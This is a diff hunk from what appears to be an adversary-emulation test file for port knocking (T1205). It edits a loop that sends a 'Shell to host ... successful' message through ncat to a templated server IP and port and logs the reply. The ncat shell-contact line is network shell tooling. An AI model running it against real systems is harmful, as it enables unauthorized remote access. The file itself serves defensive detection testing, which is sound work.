@@ -148,7 +148,7 @@ atomic_tests:
         echo -e "Anyone home?  Knock $LOOP of max 5.\n\n"
 
         sleep 2
-        cat < (echo 'echo Shell to host $HOSTNAME as user $USER successful.'  && sleep 1) | ncat #{server_ip} #{listening_port} > /tmp/t1205_client.dat 2> /dev/null
+        echo 'echo Shell to host $HOSTNAME as user $USER successful.'  && sleep 1 | ncat #{server_ip} #{listening_port} > /tmp/t1205_client.dat 2> /dev/null
         if [ -s /tmp/t1205_client.dat ] ; then
           SHELL_CONTACTED=true
           break
